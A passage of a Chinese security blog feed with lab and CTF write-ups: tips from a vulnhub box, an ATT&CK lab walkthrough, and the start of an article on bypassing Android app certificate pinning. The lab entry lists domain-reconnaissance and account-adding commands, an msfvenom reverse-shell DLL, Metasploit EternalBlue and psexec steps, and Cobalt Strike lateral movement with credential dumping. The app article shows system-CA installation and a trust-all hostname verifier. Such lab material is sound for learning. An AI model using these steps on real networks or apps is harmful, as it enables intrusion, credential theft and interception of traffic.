title="思考总结"></a>思考总结</h2><ul><li>sql注入不知道怎么绕过，即使是有了源码，代码审计还是不太会绕</li><li>扫描目录发现了一个很好用的工具dirb, 字典位置：/usr/share/dirb/wordlists</li><li>文件包含如果get不行，就换post试一试</li><li>phpmyadmin会伴随一个config.inc.php文件</li><li>phpinfo信息可以查看能否文件上传、文件包含、还有网站的根目录在哪</li><li>文件上传如果是上传图片马，必须要有文件包含读取可以解析文件的url才能菜刀连接，但是GET形式无法包含成功，那就上传一个可以命令执行的cmd马，然后后采用hackbar或者burp进行POST写入一句话文件，再菜刀连接</li><li>kali中searchsploit搜索到的exp文件路径在<code>/usr/share/exploitdb/exploits/...</code>下</li><li>反弹shell之后，如果是普通用户要进行提权，可以用 <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> 网站直接搜，也可以用<code>searchsploit</code>命令搜，我还是觉得网站搜索更方便，直接点击下载</li><li>出现错误 sh:0:can’t access tty;job control turned off错误意味着没有/bin/bash环境，要手动添加环境 <code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></li><li>getshell的方法有很多，能反弹shell就优先反弹，用菜刀连接的终端环境可能会有很多的限制，不利于提权，迫不得已先菜刀再反弹shell也行</li><li>同一操作多看一些人的文章可以获取到新的知识</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/n5xxxx__zy/article/details/97020213">https://blog.csdn.net/n5xxxx__zy/article/details/97020213</a></p><p><a href="https://101.132.145.96/25435.html">https://101.132.145.96/25435.html</a></p><p><a href="https://www.jianshu.com/p/2a7f61bbd862">https://www.jianshu.com/p/2a7f61bbd862</a></p><p><a href="https://mp.weixin.qq.com/s/VfIwnb81_8PxL6mu6InzIQ">https://mp.weixin.qq.com/s/VfIwnb81_8PxL6mu6InzIQ</a></p><p><a href="https://101.132.145.96/25435.html">https://101.132.145.96/25435.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> 内网提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK（一）靶场练习</title>
      <link href="2023/11/28/ATT&amp;CK%EF%BC%88%E4%B8%80%EF%BC%89%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>2023/11/28/ATT&amp;CK%EF%BC%88%E4%B8%80%EF%BC%89%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="外网获取权限"><a href="#外网获取权限" class="headerlink" title="外网获取权限"></a>外网获取权限</h2><p>phpmyadmin 弱口令root/root 进去，通过日志写webshell，过程简单，略</p><p><img src="https://s2.loli.net/2022/10/21/3D2l1mMS6xOPH4K.png" alt="image-20221021164541922"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>ipconfig发现有域，所以先来一波域信息收集</p><h3 id="域信息收集整理"><a href="#域信息收集整理" class="headerlink" title="域信息收集整理"></a>域信息收集整理</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all      查询本机IP段，所在域等</span><br><span class="line">net start    或   tasklist /v           查看当前运行的服务</span><br><span class="line">cmdkey /l      查看远程连接信息</span><br><span class="line">WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List   查看杀软</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">route print             路由表</span><br><span class="line">netstat -an/ano/anb     网络连接查询</span><br><span class="line">whoami /all             查询用户的权限</span><br><span class="line">ping 域名称             获取域服务器的ip</span><br><span class="line">query user  或  quser       用户登录信息 判断用户是否在线 / 查看在线用户</span><br><span class="line">hostname           主机名</span><br><span class="line">net user           本机用户列表</span><br><span class="line">net user /domain   查询域用户</span><br><span class="line">wmic useraccount get /all     获取域内用户的详细信息  可以获取到用户名，描述信息，SID 域名等</span><br><span class="line">wmic product get name,version  查看安装应用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net group /domain                          查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain          查询域管理员用户组</span><br><span class="line">net group &quot;domain cotrollers&quot; /domain      查看域控制器（如果有多台）</span><br><span class="line">net group &quot;domain computers&quot; /domain       查看所有域成员计算机列表</span><br><span class="line">net config workstation                     当前登录域</span><br><span class="line">net session        查看当前会话</span><br><span class="line">net share          查看SMB指向的路径【即共享】</span><br><span class="line">net view           查询同一域内机器列表</span><br><span class="line">net view \\ip(X.x.x.x)       查询某IP共享</span><br><span class="line">net view /domain   查询域列表</span><br><span class="line">net view /domain:domain_name   查看某个域内主机</span><br><span class="line">net accounts           查看本地密码策略</span><br><span class="line">net accounts /domain   获取域密码信息 </span><br><span class="line"></span><br><span class="line">net time /domain   判断主域（后面有$的主机名），主域服务器都做时间服务器   （发现能够执行，说明此台机器在域中 (若是此命令在显示域处显示WORKGROUP，则不存在域，若是报错：发生系统错误 5，则存在域，但该用户不是域用户)  ）</span><br><span class="line"></span><br><span class="line">net user username password /add /domain                   添加域用户</span><br><span class="line">net localgroup administrators workgroup\user001 /add      域用户添加到本机(权限不够是加不了的)</span><br><span class="line">net localhroup administrators                             本机管理员【通常含有域用户】</span><br><span class="line">net localgroup administrators /domain                     登录本机的域管理员</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nltest /domain_trusts    获取域信任信息</span><br><span class="line">nbtstat -A ip            netbios查询</span><br><span class="line">nbtstat -a 域名称        获取域服务器的ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以下需要的DC上才能使用</span><br><span class="line">dsquery computer 查看域里的计算机</span><br><span class="line">dsquery contact 查看域里的联系人</span><br><span class="line">dsquery group 查看域里的用户组</span><br><span class="line">dsquery user 查看域用户</span><br><span class="line">dsquery subnet 查看网段的划分</span><br><span class="line">dsquery server 显示所有域控    得到域控的IP</span><br><span class="line">dsquery subnet 查看域里的子网</span><br></pre></td></tr></table></figure><p>三台windows主机，测试MS17010发现all exist，之前就听说过方程式利用工具贼稳，不像cs插件和msf打不下来或者直接打蓝屏 很不稳定，所以这次试着看它是如何使用的</p><p>由原生fb.py衍生的图像化工具，可以一键日卫星 bushi</p><p>这个工具有两个模块，<strong>Eternalblue</strong> 和 <strong>Doublepulsar</strong> ，其中<strong>Eternalblue</strong>可以利用SMB漏洞，获取系统权限而<strong>Doublepulsar</strong>可以加载Metasploit生成的恶意DLL进行反弹shell</p><h3 id="方程式利用"><a href="#方程式利用" class="headerlink" title="方程式利用"></a>方程式利用</h3><p>将目录文件下的x64.dll或x86.dll替换为你要注入的恶意dll劫持文件，可以通过msf生成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.199.222 LPORT=7290 -f dll &gt; x64.dll</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/10/21/OCN2j3WwXBJ1hYU.png" alt="image-20221021165539574"></p><p>msf同时进行监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set LHOST 192.168.199.222</span><br><span class="line">set LPORT 7290</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>在工具中输入要攻击的目标 targetip， 逐个点击Attack即可</p><p><img src="https://s2.loli.net/2022/10/21/svVaUy1XF3Tn7iu.png" alt="image-20221021170125802"></p><p><img src="https://s2.loli.net/2022/10/21/Qom6gzLAajusHF2.png" alt="image-20221021170148861"></p><p>msf弹回session，转发给cs，cs添加监听</p><p><img src="https://s2.loli.net/2022/10/21/F9DvkXC3GzWYTsi.png" alt="image-20221021170440209"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.199.222</span><br><span class="line">set lport 4444</span><br><span class="line">set session 1</span><br><span class="line">set disablepayloadhandler true</span><br><span class="line">set PrependMigrate True</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>net view获取域内主机</p><p><img src="https://s2.loli.net/2022/10/21/2QK1rFBIJsbq5YG.png" alt="image-20221021171008450"></p><p>由于内网主机不出网，要通过CS派生smb beacon进行横向</p><p><img src="https://s2.loli.net/2022/10/21/7oDC6fN5TljUPu3.png" alt="image-20221021171240143"></p><p>抓取凭证信息</p><p><img src="https://s2.loli.net/2022/10/21/3THmMoGWxiDE1we.png" alt="image-20221021170801282"></p><p><img src="https://s2.loli.net/2022/10/21/HNQdgRm1W9SYwIP.png" alt="image-20221021171411238"></p><p>使用 <code>psexec</code> 模块或者 进程的token窃取均可登录其他主机 ，监听器为刚才生成的smb beacon, 会话选择新派生出的边缘主机</p><p><img src="https://s2.loli.net/2022/10/21/9brN8OSA3xnPMXD.png" alt="image-20221021172154750"></p><p>最终全部主机上线</p><p><img src="https://s2.loli.net/2022/10/21/5lijhkwEqusWYDX.png" alt="image-20221021171631551"></p><h2 id="msf模块利用总结"><a href="#msf模块利用总结" class="headerlink" title="msf模块利用总结"></a>msf模块利用总结</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/smb/ms17_010_command</span><br><span class="line">exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">exploit/windows/smb/ms17_010_psexec</span><br></pre></td></tr></table></figure><p>这里的第一个和第三个模块需要目标开启明明管道，并且比较稳定，第二个模块只要存在漏洞即可，但是会有概率把目标打蓝屏，而且杀软拦截也会比较严格，如果有杀软就基本可以放弃这个模块了</p><p>1  只是执行命令（成功率极高）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">141</span> </span><br><span class="line"><span class="built_in">set</span> command tasklist</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>2</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> RHOST  <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">141</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>3 使用ms17_010_psexec需要指定管理员的用户名、密码，否则没有session</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">141</span></span><br><span class="line"><span class="built_in">set</span> SMBUser  guest</span><br><span class="line"><span class="built_in">set</span> SMBPass  <span class="number">123456</span></span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure><blockquote><p>因为没有什么骚操作，所以过程没那么详细，主要对ms17010的稳定利用花费的一些时间和总结</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://getshell.icu/2018/Metasploit-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%9D%97%E7%9A%84%E5%88%A9%E5%BC%8A/](https://getshell.icu/2018/Metasploit-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%9D%97%E7%9A%84%E5%88%A9%E5%BC%8A/)">Metasploit 「永恒之蓝」两种模块的利弊 </a></p><p><a href="https://www.freebuf.com/column/231111.html">官方wp</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP抓包对抗</title>
      <link href="2023/11/28/APP%E6%8A%93%E5%8C%85%E5%AF%B9%E6%8A%97/"/>
      <url>2023/11/28/APP%E6%8A%93%E5%8C%85%E5%AF%B9%E6%8A%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>文章首发：<a href="https://www.sec-in.com/article/1639">https://www.sec-in.com/article/1639</a></p><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>在日常渗透过程中我们经常会遇到瓶颈无处下手，这个时候如果攻击者从公众号或者APP进行突破，往往会有很多惊喜。但是目前市场上的APP都会为防止别人恶意盗取和恶意篡改进行一些保护措施，比如<code>模拟器检测、root检测、APK加固、代码混淆、代码反调试、反脱壳、签名校验</code>等等对抗机制。而测试人员对APP进行渗透的首步操作通常就是上burp或者Charles这类抓包工具进行抓包，查看请求记录里的域名及链接地址是否可以进一步利用，但是如果遇到一些APP出现证书报错或者抓不到包的情况该怎么办，读过本篇文章之后，相信你会拥有一些新的解决方案和思考。</p><h2 id="2-数字证书"><a href="#2-数字证书" class="headerlink" title="2.数字证书"></a>2.数字证书</h2><p>我们都知道http协议传输的是明文信息，是可以直接捕获的，从而造成了数据泄露。为了防止中间人的拦截，出现了HTTPS加密机制。在HTTPS中，使用了<code>证书+数字签名</code>解决了这个问题。</p><p>这部分加密机制的知识可以阅读这篇文章<a href="https://www.cnblogs.com/TF511/articles/10791460.html">HTTPS整套加密机制是如何实现的？</a>，里面写的非常详细。此篇的重点在于如何应对APP的抓包对抗。</p><p>我总结的HTTPS加密机制如下：</p><ul><li><strong>数字签名</strong>是发送方的明文经历了两次加密得到的两个东西组成，一个是hash ，一个是经过私钥加密。</li><li><strong>数字证书</strong>就是明文+数字签名。但是数字证书中的内容远不止这俩，还包括了权威机构的信息，服务器的域名，最重要的是有签名的计算方法，不然用公钥进行解密之后的hash，如何与加密明文进行对比呢，还有证书中还包括公钥，公钥用于发放给请求证书的客户端。</li><li>HTTPS就是使用SSL/TLS协议进行加密传输，让客户端拿到服务器的公钥，然后客户端随机生成一个对称加密的秘钥，使用公钥加密，传输给服务端，后续的所有信息都通过该对称秘钥进行加密解密，完成整个HTTPS的流程。</li></ul><h2 id="3-https抓包"><a href="#3-https抓包" class="headerlink" title="3.https抓包"></a>3.https抓包</h2><h3 id="导入用户证书"><a href="#导入用户证书" class="headerlink" title="导入用户证书"></a>导入用户证书</h3><p>在第一次使用burp时，都会有这么一步，将burp的证书导出，添加进浏览器 【受信任的根证书颁发机构】中去，这样就会信任burp发来的请求包，也就可以请求数据进行修改。我们对APP抓包，也同样要将burp证书安装到系统证书中去，一般从【SD卡安装】的证书会存放在用户信任的凭据下</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20220307180246534.png" alt="image-20220307180246534"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211228140857040.png" alt="image-20211228140857040"></p><blockquote><p>但是，在Android 7.0以前，应用默认会信任系统证书和用户证书，Android 7.0开始，默认只信任系统证书。</p><p>所以如果你的手机是处于Android7.0以上版本的话，并且在没有绑定SSL证书的情况下，也会抓不到包，从安卓开发的角度可以很清楚的看到这一点。</p></blockquote><p>下图是我将burp证书安装到Android7.1.2的用户证书下，使用okhttp对<a href="https://ttt.com进行请求的结果.由于ttt.com的ssl证书是自签名证书,而自签名证书是不被系统默认信任的,所以需要先将ttt.com的自签名证书添加到系统证书中才可以访问./">https://ttt.com进行请求的结果。由于ttt.com的SSL证书是自签名证书，而自签名证书是不被系统默认信任的，所以需要先将ttt.com的自签名证书添加到系统证书中才可以访问。</a></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/Image.png" alt="Image"></p><p>自签名证书的生成如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20220321214737368.png" alt="image-20220321214737368"></p><ul><li>系统证书路径：<code>/system/etc/security/cacerts/</code></li><li>用户证书路径：<code>/data/misc/user/0/cacerts-added/</code></li></ul><p>移动到系统根证书路径的方法：</p><p>1、导出burp.der</p><p>2、使用openssl更改证书格式,先将burp证书的der格式转成pem,再获取证书的hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform DER -in burp.der -out burp.pem</span><br><span class="line">openssl x509 -inform PEM -subject_hash_old -in burp.pem </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20220323223407377.png" alt="image-20220323223407377"></p><p>3.移动到系统根证书目录路径下</p><p>Android根证书目录都是以pem证书的hash值+.0格式，所以要将刚才生成的pem改名为xxxx.0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv burp.pem 9a5ba575.0</span><br></pre></td></tr></table></figure><p>由于系统读写权限问题，不一定能直接上传到system目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb push 9a5ba575.0 &#x2F;sdcard</span><br><span class="line"></span><br><span class="line">adb shell </span><br><span class="line">mount -o remount,rw &#x2F;system</span><br><span class="line">cp &#x2F;sdcard&#x2F;9a5ba575.0 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;</span><br><span class="line">chmod 644 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;9a5ba575.0</span><br></pre></td></tr></table></figure><p>移动完成之后，再打开【设置】-【安全】-【信任的凭据】验证一下</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20220307181611032.png" alt="image-20220307181611032"></p><p>这时可以在Android7.0以上版本正常访问<a href="https://ttt.com了,其他抓包工具同理即可./">https://ttt.com了，其他抓包工具同理即可。</a></p><h3 id="证书有效期过长"><a href="#证书有效期过长" class="headerlink" title="证书有效期过长"></a>证书有效期过长</h3><p>还有一种情况是，导入到系统证书仍抓不到包，并且浏览器会报<strong>NET::ERR_CERT_VALIDITY_TOO_LONG</strong>错误。</p><p>原因是chrome从2018年开始只信任有效期少于825天（27个月）的证书，而burp证书有效期过长。</p><p>解决方案是自己做一个低于27个月的root证书导入burp，再通过burp重新导出证书并放入到系统证书路径下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out key.pem 3072 -nodes</span><br><span class="line">openssl req -new -x509 -key key.pem -sha256 -config openssl.cnf -out cert.pem -days 730 -subj &quot;&#x2F;C&#x3D;JP&#x2F;ST&#x3D;&#x2F;L&#x3D;&#x2F;O&#x3D;m4bln&#x2F;CN&#x3D;MY CA&quot;</span><br><span class="line">openssl pkcs12 -export -inkey key.pem -in cert.pem -out cert_and_key.pfx</span><br><span class="line">把cert_and_key.pfx导入burp</span><br></pre></td></tr></table></figure><p>目前还没遇到过这种情况，但是如果遇到了这种问题要知道怎么解决。</p><blockquote><p>以上两种方法都是仅依靠了系统校验证书的方式进行抓包，APP在整个请求HTTPS的请求过程时还并未进行证书校验，和在普通的浏览器中访问并无区别，只是要将想要被信任的证书放入系统证书路径内。</p></blockquote><h2 id="4-SSLPinning"><a href="#4-SSLPinning" class="headerlink" title="4.SSLPinning"></a>4.SSLPinning</h2><p>对于像ttt.com这种自签名的免费证书，不需要CA权威认证的证书，大多数APP开发商都会使用。那么如果在安卓开发的过程中，将证书的验证逻辑放在APP内部，与系统和浏览器毫无相关，这时再想将burp证书导入系统受信任路径下也于事无补了。</p><p>APP自己校验证书，分为两种，一种是将验证逻辑也在代码中，一种是写在安卓7.0之后才有的network-security-config中。</p><p>验证是方式也有两种，一种是验证证书公钥的hash值，一种是直接验证证书的公钥文件。</p><p>这种通过APP自身的验证方式就叫做证书绑定(也叫Certificate Pinning或SSL Pinning)。</p><p>那么如何去判断一个APP是否使用了证书绑定呢？首先拿到apk文件，用apktool工具进行反编译，查看敏感文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d -s &lt;file.apk&gt; -o &lt;outdir&gt;</span><br></pre></td></tr></table></figure><p>开发人员经常会将网络配置的相关文件保存到指定位置，如下图就指定在了xml目录下。</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20220321222952210.png" alt="image-20220321222952210"></p><p>所以在反编译后的res/xml目录下会有一个network_security_config.xml文件，打开看到&lt;domain-config&gt;标签，说明使用了证书绑定机制。</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20220321222356576.png" alt="image-20220321222356576"></p><h3 id="在配置文件中检验的两种方法"><a href="#在配置文件中检验的两种方法" class="headerlink" title="在配置文件中检验的两种方法"></a>在配置文件中检验的两种方法</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">network-security-config</span> <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--允许http访问--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">base-config</span> <span class="attr">cleartextTrafficPermitted</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tools:ignore</span>=<span class="string">&quot;InsecureBaseConfiguration&quot;</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--证书校验--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">domain-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">domain</span> <span class="attr">includeSubdomains</span>=<span class="string">&quot;true&quot;</span>&gt;</span>www.ttt.com<span class="tag">&lt;/<span class="name">domain</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">certificates</span> <span class="attr">src</span>=<span class="string">&quot;@raw/ttt&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">domain-config</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--公钥校验--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">domain-config</span> <span class="attr">cleartextTrafficPermitted</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">domain</span> <span class="attr">includeSubdomains</span>=<span class="string">&quot;true&quot;</span>&gt;</span>ttt.com<span class="tag">&lt;/<span class="name">domain</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--利用xml校验证书公钥的hash值--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pin-set</span> <span class="attr">expiration</span>=<span class="string">&quot;2099-01-01&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">tools:ignore</span>=<span class="string">&quot;MissingBackupPin&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pin</span> <span class="attr">digest</span>=<span class="string">&quot;SHA-256&quot;</span>&gt;</span>7VMdvZE3PGbxb0Pgf1PlCp+MI8KZ2ZC5psM8TIylNDA=<span class="tag">&lt;/<span class="name">pin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pin-set</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--利用xml校验证书的公钥文件--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">certificates</span> <span class="attr">src</span>=<span class="string">&quot;@raw/ttt&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">domain-config</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">network-security-config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这两种校验机制出现一种即可，从代码中可以看出，ttt.com就是安卓自己要校验绑定的域名。</p><p>如果只是在这个文件进行校验，有两种解决方案：一是直接将文件中校验的部分&lt;trust-anchors&gt;或&lt;pin-set&gt;注释掉，再重新打包和签名即可，但是这过程又有些麻烦，并不是上上策，如果遇到了不能重打包的apk就尴尬了。。。二是最常用的也是最好用的frida来hook关键函数进行绕过，后面会讲解。当然有些人会直接在真机或者模拟器上安装xposed模块，但是我个人觉得每次使用都要软重启，可能还会造成卡机，所以感觉还是使用frida最方便。</p><h3 id="在代码中检验的两种方法"><a href="#在代码中检验的两种方法" class="headerlink" title="在代码中检验的两种方法"></a>在代码中检验的两种方法</h3><p>1.利用代码校验证书的公钥hash</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">String hostname = <span class="string">&quot;www.ttt.com&quot;</span>;</span><br><span class="line">CertificatePinner certificatePinner = <span class="keyword">new</span> CertificatePinner.Builder()</span><br><span class="line">    .add(hostname, <span class="string">&quot;sha256/7VMdvZE3PGbxb0Pgf1PlCp+MI8KZ2ZC5psM8TIylNDA=&quot;</span>)</span><br><span class="line">    .build();</span><br><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient.Builder()</span><br><span class="line">    .certificatePinner(certificatePinner)</span><br><span class="line">    .hostnameVerifier(<span class="keyword">new</span> HostnameVerifier() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String hostname, SSLSession session)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).build();</span><br></pre></td></tr></table></figure><p>2.利用代码校验证书的公钥证书文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 